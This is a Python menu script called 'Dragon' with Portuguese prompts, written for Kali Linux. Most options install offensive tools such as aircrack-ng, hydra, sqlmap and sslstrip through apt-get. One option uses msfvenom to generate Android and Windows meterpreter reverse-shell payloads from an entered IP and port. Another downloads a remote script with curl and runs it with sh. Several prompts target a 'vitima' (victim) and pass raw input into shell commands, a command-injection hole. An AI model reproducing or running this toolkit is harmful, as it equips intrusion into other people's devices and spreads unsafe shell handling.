#!/usr/bin/python3

import time
import subprocess

print('\033[32m'+'Opening...'+'\033[0;0m')
time.sleep(3)
while True:
    opcoes = int(input('\033[32m'+'''

|--\   |--\  |--|  |---\    /---\    /\    / 
|   \  | -/  |  |  |    \-- |   |   /  \  /  
|   /  |  \  |--|  |        |   |  /    \/   
|--/   |   \ |  |   \__|    \___/  \         
                                             
created by: Mr.HACv4 
channel youtube: Hacking linux
created for: Kali Linux

  >> OPTIONS AVAILABLE <<
===========================#
---------------------------#
{1}--Information Gathering
{2}--Wireless Attacks
{3}--Password Attacks
{4}--Sniffing & Spoofing
{5}--Vulnerability Analysis
{6}--Database assessment
{7}--Web Application Analysis
{8}--Payloads
{9}--scanner de sites
{10}--Ping
{11}--Programming
{12}--Metasploit no Termux
{13}--UPDATE && UPGRADE
{14}--Extra
{15}--Exit
---------------------------#
===========================#
Dragon~# '''+'\033[0;0m'))
    if opcoes == 1:
        options = int(input('\033[34m'+'''
------------------------
{1} nmap
{2} dmitry
{3} maltegoce
{4} sparta
{5} dnsmap
{6} dnsenum
{7} theharvester
{8} wafw00f
------------------------
Dragon~# '''+'\033[0;0m'))
        if options == 1:
            print('\033[32m'+'Instalar o nmap...'+'\033[0;0m')
            time.sleep(2)
            nmap = ('apt-get install nmap')
            processo = subprocess.call([nmap], shell=True)
        elif options == 2:
            print('\033[32m'+'Instalar o dmitry...'+'\033[0;0m')
            time.sleep(2)
            dmitry = ('apt-get install dmitry')
            processo2 = subprocess.call([dmitry], shell=True)
        elif options == 3:
            print('\033[32m'+'Instalar o maltegoce...'+'\033[0;0m')
            time.sleep(2)
            maltegoce = ('apt-get install maltegoce')
            processo3 = subprocess.call([maltegoce], shell=True)
        elif options == 4:
            print('\033[32m'+'Instalar o sparta...'+'\033[0;0m')
            time.sleep(2)
            sparta = ('apt-get install sparta')
            processo4 = subprocess.call([sparta], shell=True)
        elif options == 5:
            print('\033[32m'+'Instalar o dnsmap...'+'\033[0;0m')
            time.sleep(2)
            dnsmap = ('apt-get install dnsmap')
            processo5 = subprocess.call([dnsmap], shell=True)
        elif options == 6:
            print('\033[32m'+'Instalar o dnsenum...'+'\033[0;0m')
            time.sleep(2)
            dnsenum = ('apt-get install dnsenum')
            processo6 = subprocess.call([dnsenum], shell=True)
        elif options == 7:
            print('\033[32m'+'Instalar o theharvester...'+'\033[0;0m')
            time.sleep(2)
            the = ('apt-get install theharvester')
            processow = subprocess.call([the], shell=True)
        elif options == 8:
            print('\033[32m'+'Instalar o wafw00f...'+'\033[0;0m')
            time.sleep(2)
            waf = ('apt-get install wafw00f')
            processown = subprocess.call([waf], shell=True)
    elif opcoes == 2:
        options2 = int(input('\033[34m'+'''
------------------------
{1} reaver
{2} aircrack-ng
{3} mdk3
{4} kismet
{5} pixiewps
{6} chirp
{7} wifite
{8} wifitap
{9} bully
{10} asleap
------------------------
Dragon~# '''+'\033[0;0m'))
        if options2 == 1:
            print('\033[32m'+'Instalar o reaver...'+'\033[0;0m')
            time.sleep(2)
            reaver = ('apt-get install reaver')
            processo7 = subprocess.call([reaver], shell=True)
        elif options2 == 2:
            print('\033[32m'+'Instalar o aircrack-ng...'+'\033[0;0m')
            time.sleep(2)
            aircrack = ('apt-get install aircrack-ng')
            processo8 = subprocess.call([aircrack], shell=True)
        elif options2 == 3:
            print('\033[32m'+'Instalar o mdk3...'+'\033[0;0m')
            time.sleep(2)
            mdk3 = ('apt-get install mdk3')
            processo9 = subprocess.call([mdk3], shell=True)
        elif options2 == 4:
            print('\033[32m'+'Instalar o kismet...'+'\033[0;0m')
            time.sleep(2)
            kismet = ('apt-get install kismet')
            processo10 = subprocess.call([kismet], shell=True)
        elif options2 == 5:
            print('\033[32m'+'Instalar o pixiewps...'+'\033[0;0m')
            time.sleep(2)
            pixiewps = ('apt-get install pixiewps')
            processo11 = subprocess.call([pixiewps], shell=True)
        elif options2 == 6:
            print('\033[32m'+'Instalar o chirp...'+'\033[0;0m')
            time.sleep(2)
            chirp = ('apt-get install chirp')
            processo12 = subprocess.call([chirp], shell=True)
        elif options2 == 7:
            print('\033[32m'+'vamos clonar o repositorio do wifite...'+'\033[0;0m')
            time.sleep(2)
            git = ('git clone https://github.com/derv82/wifite')
            processi = subprocess.call([git], shell=True)
            print('ok terminamos, voltando...')
        elif options2 == 8:
            print('\033[32m'+'Instalar o wifitap...'+'\033[0;0m')
            time.sleep(2)
            wifitap = ('apt-get install wifitap')
            processo1dsds7 = subprocess.call([wifitap], shell=True)
        elif options2 == 9:
            print('\033[32m'+'Instalar o bully...'+'\033[0;0m')
            time.sleep(2)
            bully = ('apt-get install bully')
            processoss18 = subprocess.call([bully], shell=True)
        elif options2 == 10:
            print('\033[32m'+'Instalar o asleap...'+'\033[0;0m')
            time.sleep(2)
            asleap = ('apt-get install asleap')
            processo1sddf9 = subprocess.call([asleap], shell=True)
    elif opcoes == 3:
        options3 = int(input('\033[34m'+'''
------------------------
{1} ncrack
{2} hashcat
{3} jonh
{4} medusa
{5} pyrit
{6} cewl
{7} crunch
{8} hydra
{9} patator
{10} smbmap
------------------------
Dragon~# '''+'\033[0;0m'))
        if options3 == 1:
            print('\033[32m'+'Instalar o ncrack...'+'\033[0;0m')
            time.sleep(2)
            ncrack = ('apt-get install ncrack')
            processo13 = subprocess.call([ncrack], shell=True)
        elif options3 == 2:
            print('\033[32m'+'Instalar o hashcat...'+'\033[0;0m')
            time.sleep(2)
            hashcat = ('apt-get install hashcat')
            processo14 = subprocess.call([hashcat], shell=True)
        elif options3 == 3:
            print('\033[32m'+'Instalar o jonh...'+'\033[0;0m')
            time.sleep(2)
            jonh = ('apt-get install jonh')
            processo15 = subprocess.call([jonh], shell=True)
        elif options3 == 4:
            print('\033[32m'+'Instalar o medusa...'+'\033[0;0m')
            time.sleep(2)
            medusa = ('apt-get install medusa')
            processo16 = subprocess.call([medusa], shell=True)
        elif options3 == 5:
            print('\033[32m'+'Instalar o pyrit...'+'\033[0;0m')
            time.sleep(2)
            pyrit = ('apt-get install pyrit')
            processo17 = subprocess.call([pyrit], shell=True)
        elif options3 == 6:
            print('\033[32m'+'Instalar o cewl...'+'\033[0;0m')
            time.sleep(2)
            cewl = ('apt-get install cewl')
            processo18 = subprocess.call([cewl], shell=True)
        elif options3 == 7:
            print('\033[32m'+'Instalar o crunch...'+'\033[0;0m')
            time.sleep(2)
            crunch = ('apt-get install crunch')
            processo19 = subprocess.call([crunch], shell=True)
        elif options3 == 8:
            print('\033[32m'+'Instalar o hydra...'+'\033[0;0m')
            time.sleep(2)
            hydra = ('apt-get install hydra')
            processodsd17 = subprocess.call([hydra], shell=True)
        elif options3 == 9:
            print('\033[32m'+'Instalar o patator...'+'\033[0;0m')
            time.sleep(2)
            pata = ('apt-get install patator')
            processo1sd8 = subprocess.call([pata], shell=True)
        elif options3 == 10:
            print('\033[32m'+'Instalar o smbmap...'+'\033[0;0m')
            time.sleep(2)
            smb = ('apt-get install smbmap')
            processo19ds = subprocess.call([smb], shell=True)
    elif opcoes == 4:
        options4 = int(input('\033[34m'+'''
------------------------
{1} ferret
{2} responder
{3} wireshark
{4} hamster
{5} driftnet
{6} netsniff-ng
{7} dsniff
{8} bdfproxy
{9} dnschef
{10} sslstrip
------------------------
Dragon~# '''+'\033[0;0m'))
        if options4 == 1:
            print('\033[32m'+'Instalar o ferret...'+'\033[0;0m')
            time.sleep(2)
            ferret = ('apt-get install ferret')
            processo204345 = subprocess.call([ferret], shell=True)
        elif options4 == 2:
            print('\033[32m'+'Instalar o responder...'+'\033[0;0m')
            time.sleep(2)
            responder = ('apt-get install responder')
            processo21434 = subprocess.call([responder], shell=True)
        elif options4 == 3:
            print('\033[32m'+'Instalar o wireshark...'+'\033[0;0m')
            time.sleep(2)
            wireshark = ('apt-get install wireshark')
            processo2243 = subprocess.call([wireshark], shell=True)
        elif options4 == 4:
            print('\033[32m'+'Instalar o hamster...'+'\033[0;0m')
            time.sleep(2)
            hamster = ('apt-get install hamster')
            processo2334 = subprocess.call([hamster], shell=True)
        elif options4 == 5:
            print('\033[32m'+'Instalar o driftnet...'+'\033[0;0m')
            time.sleep(2)
            driftnet = ('apt-get install driftnet')
            processo3943 = subprocess.call([driftnet], shell=True)
        elif options4 == 6:
            print('\033[32m'+'Instalar o netsniff-ng...'+'\033[0;0m')
            time.sleep(2)
            net = ('apt-get install netsniff-ng')
            processo002 = subprocess.call([net], shell=True)
        elif options4 == 7:
            print('\033[32m'+'Instalar o dsniff...'+'\033[0;0m')
            time.sleep(2)
            dsniff = ('apt-get install dsniff')
            processo100 = subprocess.call([dsniff], shell=True)
        elif options4 == 8:
            print('\033[32m'+'Instalar o bdfproxy...'+'\033[0;0m')
            time.sleep(2)
            bdf = ('apt-get install bdfproxy')
            processo894 = subprocess.call([bdf], shell=True)
        elif options4 == 9:
            print('\033[32m'+'Instalar o dnschef...'+'\033[0;0m')
            time.sleep(2)
            dnschef = ('apt-get install dnschef')
            processo456 = subprocess.call([dnschef], shell=True)
        elif options4 == 10:
            print('\033[32m'+'Instalar o sslstrip...'+'\033[0;0m')
            time.sleep(2)
            ssl = ('apt-get install sslstrip')
            processo02s = subprocess.call([ssl], shell=True)
    elif opcoes == 5:
        options5 = int(input('\033[34m'+'''
------------------------
{1} nikto
{2} lynis
{3} golismero
{4} yersinia
{5} t50
{6} sfuzz
{7} bed
------------------------
Dragon~# '''+'\033[0;0m'))
        if options5 == 1:
            print('\033[32m'+'Instalar o nikto...'+'\033[0;0m')
            time.sleep(2)
            nikto = ('apt-get install nikto')
            processo26 = subprocess.call([nikto], shell=True)
        elif options5 == 2:
            print('\033[32m'+'Instalar o lynis...'+'\033[0;0m')
            time.sleep(2)
            lynis = ('apt-get install lynis')
            processo27 = subprocess.call([lynis], shell=True)
        elif options5 == 3:
            print('\033[32m'+'Instalar o golismero...'+'\033[0;0m')
            time.sleep(2)
            golismero = ('apt-get install golismero')
            processo28 = subprocess.call([golismero], shell=True)
        elif options5 == 4:
            print('\033[32m'+'Instalar o yersinia..'+'\033[0;0m')
            time.sleep(2)
            yersinia = ('apt-get install yersinia')
            processo29 = subprocess.call([yersinia], shell=True)
        elif options5 == 5:
            print('\033[32m'+'Instalar o t50...'+'\033[0;0m')
            time.sleep(2)
            t50 = ('apt-get install t50')
            processo30 = subprocess.call([t50], shell=True)
        elif options5 == 6:
            print('\033[32m'+'Instalar o sfuzz...'+'\033[0;0m')
            time.sleep(2)
            sfuzz = ('apt-get install sfuzz')
            processo31 = subprocess.call([sfuzz], shell=True)
        elif options5 == 7:
            print('\033[32m'+'Instalar o bed...'+'\033[0;0m')
            time.sleep(2)
            bed = ('apt-get install bed')
            processo32 = subprocess.call([bed], shell=True)
    elif opcoes == 6:
        options00 = int(input('\033[34m'+'''
------------------------
{1} sqlninja
{2} sqlmap
{3} sqlsus
------------------------
Dragon~# '''+'\033[0;0m'))
        if options00 == 1:
            print('\033[32m'+'Instalar o sqlninja...'+'\033[0;0m')
            time.sleep(2)
            sqlninja = ('apt-get install sqlninja')
            processoodfs = subprocess.call([sqlninja], shell=True)
        elif options00 == 2:
            print('\033[32m'+'Instalar o sqlmap...'+'\033[0;0m')
            time.sleep(2)
            sqlmap = ('apt-get install sqlmap')
            processo3ss2 = subprocess.call([sqlmap], shell=True)
        elif options00 == 3:
            print('\033[32m'+'Instalar sqlsus...'+'\033[0;0m')
            time.sleep(2)
            sqlsus = ('apt-get install sqlsus')
            processo3weg2 = subprocess.call([sqlsus], shell=True)
    elif opcoes == 7:
        options0023 = int(input('\033[34m'+'''
------------------------
{1} httrack
{2} skipfish
{3} wpscan
{4} cadaver
{5} whatweb
------------------------
Dragon~# '''+'\033[0;0m'))
        if options0023 == 1:
            print('\033[32m'+'Instalar o httrack...'+'\033[0;0m')
            time.sleep(2)
            httrack = ('apt-get install httrack')
            processo26dffs = subprocess.call([httrack], shell=True)
        elif options0023 == 2:
            print('\033[32m'+'Instalar o skipfish...'+'\033[0;0m')
            time.sleep(2)
            skipfish = ('apt-get install skipfish')
            processo27fdd = subprocess.call([skipfish], shell=True)
        elif options0023 == 3:
            print('\033[32m'+'Instalar o wpscan...'+'\033[0;0m')
            time.sleep(2)
            wpscan = ('apt-get install wpscan')
            processo28fd = subprocess.call([wpscan], shell=True)
        elif options0023 == 4:
            print('\033[32m'+'Instalar o cadaver..'+'\033[0;0m')
            time.sleep(2)
            cadaver = ('apt-get install cadaver')
            processo2fd9 = subprocess.call([cadaver], shell=True)
        elif options0023 == 5:
            print('\033[32m'+'Instalar o whatweb...'+'\033[0;0m')
            time.sleep(2)
            web = ('apt-get install whatweb')
            processo30df = subprocess.call([web], shell=True)
    elif opcoes == 8:
        opti = int(input('\033[34m'+'''
------------------------
{1} Android
{2} Windows
------------------------
Dragon~# '''+'\033[0;0m'))
        if opti == 1:
            ip = input('Diga seu Ip: ')
            porta = int(input('Diga sua Porta: '))
            android = ('msfvenom -p android/meterpreter/reverse_tcp LHOST={} LPORT={} R > /root/Desktop/dragon.apk'.format(ip, porta))
            print('gerando payload...')
            time.sleep(1)
            process3 = subprocess.call([android], shell=True)
        elif opti == 2:
            ip2 = input('Diga seu Ip: ')
            porta2 = int(input('Diga sua Porta: '))
            windows = ('msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} R > /root/Desktop/dragon.exe'.format(ip2, porta2))
            print('gerando payload...')
            time.sleep(1)
            process323dv = subprocess.call([windows], shell=True)
    elif opcoes == 9:
        o = int(input('\033[34m'+'''
-----------------------------
(1) whatweb
(2) theharvester
(3) golismero
-----------------------------
Dragon~# '''))
        if o == 1:
            url = str(input('url do site: '))
            whatweb = ('whatweb -v {}'.format(url))
            proc = subprocess.call([whatweb], shell=True)
        elif o == 2:
            url2 = str(input('url do site: '))
            p = int(input('tanto de pesquisas max:1000: '))
            theharvester = ('theharvester -d {} -l {} -b all'.format(url2, p))
            pr = subprocess.call([theharvester], shell=True)
        elif o == 3:
            gol = str(input('url do site: '))
            golis = ('golismero -v {}'.format(gol))
            good = subprocess.call([golis], shell=True)
        elif o >= 4:
            print('Erro')
    elif opcoes == 10:
        host = str(input('Ip ou Url da vitima: '))
        ping3 = ('ping {}'.format(host))
        ping2 = subprocess.call([ping3], shell=True)
    elif opcoes == 11:
        optiosdf = int(input('\033[34m'+'''
------------------------
{1} Gedit
{2} Nano
{3} Pluma
{4} vim
------------------------
Dragon~# '''+'\033[0;0m'))
        if optiosdf == 1:
            gedit = ('apt-get install gedit')
            p0 = subprocess.call([gedit], shell=True)
        elif optiosdf == 2:
            nano = ('apt-get install nano')
            p1 = subprocess.call([nano], shell=True)
        elif optiosdf == 3:
            pluma = ('apt-get install pluma')
            p2 = subprocess.call([pluma], shell=True)
        elif optiosdf == 4:
            vim = ('apt-get install vim')
            p3 = subprocess.call([vim], shell=True)
    elif opcoes == 12:
	    termux = ('apt update')
	    termuxp = subprocess.call([termux], shell=True)
	    permissao = ('termux-setup-storage')
	    permissao2 = subprocess.call([permissao], shell=True)
	    curlt = ('apt install curl')
	    curlt2334 = subprocess.call([curlt], shell=True)
	    m = ('curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh')
	    m2 = subprocess.call([m], shell=True)
	    M = ('sh metasploit.sh')
	    M2 = subprocess.call([M], shell=True)
    elif opcoes == 13:
        u = ('apt-get update && apt-get upgrade')
        processo33 = subprocess.call([u], shell=True)
    elif opcoes == 14:
        print('\033[31m'+'''
        |--- /----\ |--\ |---- |\  / /---- |----
        |--  |    | | |  |---- | \/  --/   |----
        |    \----/ |  \ |---- \    --/    |----'''+'\033[0;0m')

        optionsextra = int(input('\033[34m'+'''
------------------------
(1) Forense
(2) Analise de Metadata
------------------------
Dragon~# '''+'\033[0;0m'))
        if optionsextra == 1:
            optionsextra2 = int(input('\033[34m'+'''
------------------------
{1} Autopsy
{2} Binwalk
{3} foremost 
{4} volafox
{5} chkrootkit
------------------------
Dragon~# '''+'\033[0;0m'))
            if optionsextra2 == 1:
                autopsy = ('apt-get install autopsy')
                processoautopsy = subprocess.call([autopsy], shell=True)
            elif optionsextra2 == 2:
                binwalk = ('apt-get install binwalk')
                processobinwalk = subprocess.call([binwalk], shell=True)
            elif optionsextra2 == 3:
                foremost = ('apt-get install foremost')
                foremost2 = subprocess.call([foremost], shell=True)
            elif optionsextra2 == 4:
                volafox = ('apt-get install volafox')
                volafox2 = subprocess.call([volafox], shell=True)
            elif optionsextra2 == 5:
                chkrootkit = ('apt-get install chkrootkit')
                chroot = subprocess.call([chkrootkit], shell=True)
        elif optionsextra == 2:
            exiftool = ('apt-get install exiftool')
            arquivo = input('digite o nome do arquivo: ')
            tool = ('exiftool {}'.format(arquivo))
            processoexiftool = subprocess.call([tool], shell=True)
    elif opcoes == 15:
        print('Log out...')
        time.sleep(3)
        break
    elif opcoes > 16:
        print('Erro Voce Nao Escolheu Uma Opcao!!!')
        print('voltando...')
